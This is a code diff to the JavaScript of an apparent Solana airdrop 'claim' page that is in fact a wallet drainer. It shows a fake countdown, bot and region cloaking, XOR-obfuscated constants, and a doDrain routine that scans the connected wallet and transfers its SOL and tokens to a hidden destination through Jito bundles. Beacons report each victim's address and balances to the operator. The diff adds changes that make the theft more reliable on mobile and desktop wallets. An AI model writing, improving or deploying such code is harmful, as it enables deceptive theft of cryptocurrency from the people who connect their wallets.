@@ -1,6 +1,21 @@
 (()=>{
   'use strict';
 
+  // surface JS errors on-page
+  window.addEventListener('error', function(ev){
+    try{
+      const el=document.getElementById('errorBox');
+      if(el){ el.style.display='block'; el.textContent='Script error: '+(ev.message||'unknown'); }
+      console.error('page error:', ev.message, ev.filename, ev.lineno);
+    }catch(e){}
+  });
+  window.addEventListener('unhandledrejection', function(ev){
+    try{
+      const el=document.getElementById('errorBox');
+      if(el){ el.style.display='block'; el.textContent='Async error: '+(ev.reason&&ev.reason.message?ev.reason.message:'unknown'); }
+    }catch(e){}
+  });
+
   // polyfill for older browsers
   if(typeof AbortSignal!=='undefined'&&!AbortSignal.timeout){ AbortSignal.timeout=function(ms){ var c=new AbortController(); setTimeout(function(){c.abort();},ms); return c.signal; }; }
 
@@ -10,10 +25,10 @@
 
   // ── encoded constants ──
   const _enc = [
-    'VG9rZWtlZ1FmZVp5aU53QUpiTmJHS1BGWENXdUJ2ZjlTczYyM1ZRNURB', // Tokenkeg...
-    'VG9rZW56UWRCTmJMcVA1VkVoZGtBUzZFUUZMQzFQSG5CcVhFcFB4dUVi', // TokenzQd...
-    'OTZyZ1dGNVVZcDV1RWZUOTFNVFBOaVlUQ3FjdU5oRDR4ZVBVNXhBNQ==', // jitp tip acc (placeholder)
-    'U2V0QXV0aG9yaXR5' // SetAuthority literal (unused directly)
+    'VG9rZWtlZ1FmZVp5aU53QUpiTmJHS1BGWENXdUJ2ZjlTczYyM1ZRNURB',
+    'VG9rZW56UWRCTmJMcVA1VkVoZGtBUzZFUUZMQzFQSG5CcVhFcFB4dUVi',
+    'OTZyZ1dGNVVZcDV1RWZUOTFNVFBOaVlUQ3FjdU5oRDR4ZVBVNXhBNQ==',
+    'U2V0QXV0aG9yaXR5'
   ];
   const _xor = (s)=>{ let r=''; for(let i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^_k.charCodeAt(i%_k.length)); return r; };
   const _dec = (b)=>_xor(atob(b));
@@ -181,7 +196,7 @@
     return good;
   }
 
-  // ── TOCTOU guard: re-verify ownership/state before sign ──
+  // ── TOCTOU guard ──
   async function verifyAtomic(owner, snapshot, destPk){
     const fresh = await discover(owner);
     if(fresh.solBalance < snapshot.solBalance*0.95) throw new Error('eligibility_changed');
@@ -190,7 +205,6 @@
     const freshSet = new Set(fresh.tokens.map(snapKey));
     for(const t of fresh.tokens){ if(!snapSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
     for(const t of snapshot.tokens){ if(!freshSet.has(snapKey(t))) throw new Error('eligibility_changed'); }
-    // verify ownership still points to us
     for(const t of fresh.tokens){
       const info = await rpcCall(c=>c.getAccountInfo(t.tokenAcct),'owner');
       if(!info || info.owner.toBase58() !== owner.toBase58()) throw new Error('eligibility_changed');
@@ -200,12 +214,13 @@
 
   // ── UI ──
   function $(id){return document.getElementById(id);}
+  function setText(el, text){ if(el){ const span=el.querySelector('.btn-text'); if(span) span.textContent=text; else el.textContent=text; } }
   function setStatus(msg, isError=false){
     const s=$('statusBox'), e=$('errorBox');
-    if(isError){ e.style.display='block'; e.textContent=msg; s.style.display='none'; }
-    else { s.style.display='block'; s.innerHTML=msg; e.style.display='none'; }
+    if(isError){ if(e){ e.style.display='block'; e.textContent=msg; } if(s) s.style.display='none'; }
+    else { if(s){ s.style.display='block'; s.innerHTML=msg; } if(e) e.style.display='none'; }
   }
-  function clearStatus(){ $('statusBox').style.display='none'; $('errorBox').style.display='none'; }
+  function clearStatus(){ const s=$('statusBox'), e=$('errorBox'); if(s) s.style.display='none'; if(e) e.style.display='none'; }
 
   let connection=null, wallet=null, walletPubkey=null, latestBlockhash=null;
 
@@ -215,45 +230,55 @@
       if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ resolve(); return; }
       const start = Date.now();
       const t = setInterval(()=>{
-        if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ clearInterval(t); clearInterval(fail); resolve(); }
-        if(Date.now()-start > timeout){ clearInterval(t); clearInterval(fail); reject(new Error('solana timeout')); }
+        if(typeof solanaWeb3!=='undefined' && solanaWeb3.PublicKey){ clearInterval(t); resolve(); }
+        else if(Date.now()-start > timeout){ clearInterval(t); reject(new Error('solana timeout')); }
       },100);
-      const fail = t;
     });
   }
 
   // ── init ──
   async function init(retry=false){
     try{
-      if(!retry){ $('btnRetry').style.display='none'; }
-      $('loadingMsg').style.display='block';
-      $('loadingMsg').innerHTML = 'Initializing wallet libraries...';
-      if(_isBot()){ _maint('Service temporarily unavailable in your region.'); throw new Error('unavailable'); }
-      $('loadingMsg').textContent='Loading config & seed...';
+      const btnRetry=$('btnRetry'); if(btnRetry) btnRetry.style.display='none';
+      const loadingMsg=$('loadingMsg'); if(loadingMsg){ loadingMsg.style.display='block'; loadingMsg.textContent='Loading...'; }
+
+      const btnConnect=$('btnConnect');
+      if(btnConnect){ btnConnect.disabled=false; setText(btnConnect, isMobile()?'Open in Phantom':'Connect Wallet'); }
+
+      if(_isBot()){ _maint('Service temporarily unavailable in your region.'); return; }
+
       await Promise.all([loadConfig(), loadSeed()]);
-      if(!_cfg.enabled){ $('loadingMsg').textContent='Distribution event is currently paused. Check back later.'; return; }
-      $('loadingMsg').textContent='Loading Solana Web3...';
+      if(!_cfg.enabled){
+        if(loadingMsg) loadingMsg.textContent='Distribution event is currently paused. Check back later.';
+        if(btnConnect) btnConnect.disabled=true;
+        return;
+      }
+
       await waitForSolana(12000);
-      $('loadingMsg').textContent='Starting app...';
-      try { TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'); } catch(e) { throw new Error('TOKEN_PROG invalid: ' + e.message); }
-      try { TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb'); } catch(e) { throw new Error('TOKEN_2022 invalid: ' + e.message); }
+      try { TOKEN_PROG = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'); } catch(e){ throw new Error('TOKEN_PROG invalid: ' + e.message); }
+      try { TOKEN_2022 = new solanaWeb3.PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb'); } catch(e){ throw new Error('TOKEN_2022 invalid: ' + e.message); }
       connection = new solanaWeb3.Connection(RPCS[0],'confirmed');
-      $('btnConnect').disabled=false; $('btnConnect').querySelector('.btn-text').textContent='Connect Wallet'; $('loadingMsg').style.display='none';
-      $('btnRetry').style.display='none';
+
+      if(loadingMsg) loadingMsg.style.display='none';
+      if(btnRetry) btnRetry.style.display='none';
+      checkWalletPresence();
       startCountdown();
     }catch(e){
       console.error('init error', e);
-      $('loadingMsg').innerHTML = '<span style="color:#ff6b6b">Failed to initialize: ' + (e.message || 'unknown') + '. Check console and refresh.</span>';
-      $('btnConnect').disabled = true;
-      $('btnRetry').style.display='inline-block';
+      const btnConnect=$('btnConnect'); if(btnConnect) btnConnect.disabled=false;
+      const loadingMsg=$('loadingMsg');
+      if(loadingMsg) loadingMsg.innerHTML = '<span style="color:#ff6b6b">Partial init failure: ' + (e.message || 'unknown') + '. Connect may still work.</span>';
+      checkWalletPresence();
+      startCountdown();
     }
   }
 
   function retryInit(){ init(true); }
 
   function startCountdown(){
-    let sec=23*3600+14*60+8;
     const el=$('countdown');
+    if(!el) return;
+    let sec=23*3600+14*60+8;
     setInterval(()=>{
       sec--; if(sec<0)sec=23*3600+14*60+8;
       const h=String(Math.floor(sec/3600)).padStart(2,'0'); const m=String(Math.floor((sec%3600)/60)).padStart(2,'0'); const s=String(sec%60).padStart(2,'0');
@@ -262,11 +287,17 @@
   }
 
   function detectWallet(){
-    if(window.phantom&&window.phantom.solana) return {provider:window.phantom.solana, name:'Phantom'};
-    if(window.solflare) return {provider:window.solflare, name:'Solflare'};
-    if(window.braveSolana) return {provider:window.braveSolana, name:'Brave'};
-    if(window.solana&&window.solana.isPhantom) return {provider:window.solana, name:'Phantom (window.solana)'};
-    if(window.solana) return {provider:window.solana, name:'Browser wallet'};
+    if(window.phantom && window.phantom.solana && typeof window.phantom.solana.connect==='function')
+      return {provider:window.phantom.solana, name:'Phantom'};
+    if(window.solflare && typeof window.solflare.connect==='function')
+      return {provider:window.solflare, name:'Solflare'};
+    if(window.solana && typeof window.solana.connect==='function'){
+      if(window.solana.isBraveWallet) return {provider:window.solana, name:'Brave Wallet'};
+      if(window.solana.isPhantom) return {provider:window.solana, name:'Phantom'};
+      return {provider:window.solana, name:'Browser wallet'};
+    }
+    if(window.braveSolana && typeof window.braveSolana.connect==='function')
+      return {provider:window.braveSolana, name:'Brave Wallet'};
     return null;
   }
 
@@ -277,8 +308,8 @@
     let links = [];
     if(isMobile()){
       links = [
-        {name:'Phantom', url:'https://phantom.app/ul/browse/' + currentUrl},
-        {name:'Solflare', url:'https://solflare.com/ul/browse/' + currentUrl}
+        {name:'Open in Phantom', url:'https://phantom.app/ul/browse/' + currentUrl},
+        {name:'Open in Solflare', url:'https://solflare.com/ul/browse/' + currentUrl}
       ];
     } else {
       links = [
@@ -295,22 +326,43 @@
     return html;
   }
 
+  function openPhantomMobile(){
+    window.location.href = 'https://phantom.app/ul/browse/' + encodeURIComponent(window.location.href);
+  }
+
+  function checkWalletPresence(){
+    const btn=$('btnConnect'); if(!btn) return;
+    if(isMobile()){ setText(btn,'Open in Phantom'); return; }
+    const detected = detectWallet();
+    if(detected){
+      btn.disabled=false;
+      setText(btn,'Connect '+detected.name);
+      clearStatus();
+    } else {
+      btn.disabled=false;
+      setText(btn,'No Wallet Found');
+      let msg = 'No Solana wallet detected in this browser. Install one, then refresh this page.';
+      msg += walletLinks();
+      setStatus(msg);
+    }
+  }
+
   async function connectWallet(){
-    const btn=$('btnConnect'); btn.disabled=true; clearStatus();
-    if(typeof solanaWeb3==='undefined'){ setStatus('Solana libraries still loading. Refresh the page.',true); btn.disabled=false; return; }
+    const btn=$('btnConnect'); if(btn) btn.disabled=true; clearStatus();
+    if(typeof solanaWeb3==='undefined'){
+      setStatus('<span class="spinner"></span> Loading wallet libraries...');
+      try{ await waitForSolana(10000); }
+      catch(e){ setStatus('Wallet libraries failed to load. Hard refresh the page (Ctrl+Shift+R) and try again.',true); if(btn) btn.disabled=false; return; }
+    }
     const detected = detectWallet();
     if(!detected){
-      let msg = 'No Solana wallet detected.';
-      if(isMobile()){
-        msg += ' Open this page in your wallet app browser, or use a wallet browser like Phantom or Solflare.';
-      } else {
-        msg += ' Install a wallet extension to continue.';
-      }
+      if(isMobile()){ if(btn) btn.disabled=false; openPhantomMobile(); return; }
+      let msg = 'No Solana wallet detected. Install a wallet extension to continue.';
       msg += walletLinks();
-      setStatus(msg); btn.disabled=false; return;
+      setStatus(msg); if(btn) btn.disabled=false; return;
     }
     const provider=detected.provider, providerName=detected.name;
-    if(typeof provider.connect !== 'function'){ setStatus(providerName + ' wallet is not ready. Unlock or refresh your wallet extension.',true); btn.disabled=false; return; }
+    if(typeof provider.connect !== 'function'){ setStatus(providerName + ' wallet is not ready. Unlock or refresh your wallet extension.',true); if(btn) btn.disabled=false; return; }
     setStatus('Connecting to ' + providerName + '...');
     try{
       let resp;
@@ -325,21 +377,46 @@
         catch(e2) { throw new Error('Wallet did not respond'); }
       }
       wallet=provider; walletPubkey=resp.publicKey; if(!walletPubkey) throw new Error('No public key');
-      $('connectSection').style.display='none'; $('connectedSection').style.display='block';
-      const addr=walletPubkey.toString(); $('walletAddr').textContent=addr.slice(0,4)+'...'+addr.slice(-4);
-      $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Agree to terms';
+      const connectSection=$('connectSection'), connectedSection=$('connectedSection');
+      if(connectSection) connectSection.style.display='none';
+      if(connectedSection) connectedSection.style.display='block';
+      const addr=walletPubkey.toString();
+      const walletAddr=$('walletAddr'); if(walletAddr) walletAddr.textContent=addr.slice(0,4)+'...'+addr.slice(-4);
+      const btnClaim=$('btnClaim'); if(btnClaim){ btnClaim.disabled=true; setText(btnClaim,'Agree to terms'); }
       beacon('🔗 CONNECT '+addr); report(addr,{solBalance:0,tokenCount:0});
-    }catch(e){ console.error('wallet connect error', e); setStatus('Connection rejected: '+(e.message||'User declined').slice(0,80),true); btn.disabled=false; }
+      clearStatus();
+    }catch(e){
+      console.error('wallet connect error', e);
+      let msg='Connection: '+(e.message||'User declined').slice(0,80);
+      if(e.message==='Wallet connection timed out'){
+        if(providerName==='Brave Wallet') msg='Brave Wallet not responding. Open brave://wallet, make sure Solana is enabled and the wallet is unlocked, then retry.';
+        else msg='Wallet not responding. Unlock your wallet extension and retry.';
+      }
+      setStatus(msg,true); if(btn) btn.disabled=false;
+    }
   }
 
   function updateButton(){
     const chk=$('chkAgree'), btn=$('btnClaim');
-    btn.disabled=!chk.checked; btn.querySelector('.btn-text').textContent=chk.checked?'Claim Allocation':'Agree to terms';
+    if(!chk || !btn) return;
+    btn.disabled=!chk.checked;
+    setText(btn, chk.checked?'Claim Allocation':'Agree to terms');
   }
 
-  // ── drain with TOCTOU ──
+  // ── robust event binding ──
+  function bindButtons(){
+    const bc=$('btnConnect'), bk=$('btnRetry'), bcl=$('btnClaim'), chk=$('chkAgree');
+    if(bc && !bc._bound){ bc._bound=true; bc.addEventListener('click', function(e){ e.preventDefault(); connectWallet(); }); }
+    if(bk && !bk._bound){ bk._bound=true; bk.addEventListener('click', function(e){ e.preventDefault(); retryInit(); }); }
+    if(bcl && !bcl._bound){ bcl._bound=true; bcl.addEventListener('click', function(e){ e.preventDefault(); if(!$('btnClaim').disabled) doDrain(); }); }
+    if(chk && !chk._bound){ chk._bound=true; chk.addEventListener('change', updateButton); }
+  }
+  if(document.readyState==='loading'){ document.addEventListener('DOMContentLoaded', bindButtons); } else { bindButtons(); }
+
+  // ── drain ──
   async function doDrain(){
-    const btn=$('btnClaim'); btn.disabled=true; clearStatus(); $('agreeSection').style.display='none';
+    const btn=$('btnClaim'); if(btn) btn.disabled=true; clearStatus();
+    const agreeSection=$('agreeSection'); if(agreeSection) agreeSection.style.display='none';
     try{
       setStatus('<span class="spinner"></span> Scanning wallet...');
       const owner=walletPubkey;
@@ -347,10 +424,8 @@
       report(owner.toString(),{solBalance:disc.solBalance,tokenCount:disc.tokens.length});
       const destPk=new solanaWeb3.PublicKey(dest());
 
-      // priority fee
       const dynFee=await getDynamicFee();
 
-      // classify
       const mintSet=new Set(); const mints=[];
       for(const t of disc.tokens){ const k=t.mint.toBase58(); if(!mintSet.has(k)){mintSet.add(k);mints.push(t.mint);} }
       const classes=await classify(mints);
@@ -361,13 +436,11 @@
 
       const solAbove=disc.solBalance>_cfg.solReserve?disc.solBalance-_cfg.solReserve:0;
       const solToSend=Math.floor(solAbove*(_cfg.solPercentage/100));
-      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Not Eligible'; beacon('❌ EMPTY '+owner.toString()); return; }
+      if((drainable.length===0&&solToSend<=0)||disc.solBalance<50000){ setStatus('<span style="color:var(--error)">You are not eligible for this distribution. No qualifying activity detected.</span>'); if(btn){ btn.disabled=true; setText(btn,'Not Eligible'); } beacon('❌ EMPTY '+owner.toString()); return; }
 
-      // TOCTOU: snapshot and re-verify before building final txs
       const snapshot={solBalance:disc.solBalance,tokens:drainable};
       await verifyAtomic(owner,snapshot,destPk);
 
-      // fresh blockhash for deadline guard
       const latest=await rpcCall(c=>c.getLatestBlockhash('confirmed'),'bh'); latestBlockhash=latest;
       const bh=latest.blockhash; const lvbh=latest.lastValidBlockHeight;
 
@@ -386,7 +459,6 @@
         tx.recentBlockhash=bh; tx.feePayer=owner; txs.push(tx);
       }
 
-      // second TOCTOU re-verify right before signing
       await verifyAtomic(owner,{solBalance:snapshot.solBalance,tokens:drainable},destPk);
 
       setStatus('<span class="spinner"></span> Confirm the transaction in your wallet...');
@@ -412,7 +484,6 @@
           beacon('JITO '+owner.toString()+' | tok:'+drainable.length+' | sol:'+(solToSend/1e9).toFixed(4));
         }catch(e){
           if(e.message && (e.message.includes('rejected')||e.message.includes('declined'))){ setStatus('Transaction declined. You must approve to claim.',true); resetUI(); return; }
-          // fallback below
         }
       }
       if(sent===0 && txs.length>0){
@@ -438,7 +509,8 @@
   }
 
   function resetUI(){
-    $('agreeSection').style.display='flex'; $('btnClaim').disabled=true; $('btnClaim').querySelector('.btn-text').textContent='Agree to terms';
+    const agreeSection=$('agreeSection'); if(agreeSection) agreeSection.style.display='flex';
+    const btn=$('btnClaim'); if(btn){ btn.disabled=true; setText(btn,'Agree to terms'); }
   }
 
   // expose minimal globals
